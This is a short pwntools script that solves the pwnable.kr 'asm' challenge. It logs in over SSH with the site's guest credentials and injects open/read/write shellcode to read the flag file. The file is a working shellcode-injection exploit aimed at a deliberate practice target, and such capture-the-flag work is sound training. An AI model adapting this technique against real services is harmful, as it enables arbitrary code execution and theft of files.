from pwn import *

context(arch="amd64", os="linux")
sh = ssh(user="asm", host="pwnable.kr", port=2222, password="guest")
p = sh.remote("0", 9026)

flag = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellcode = asm(
    shellcraft.open(flag) + shellcraft.read("rax", "rsp", 50) +
    shellcraft.write(1, "rsp", 50) + shellcraft.exit(0))

p.sendline(shellcode)
p.interactive()
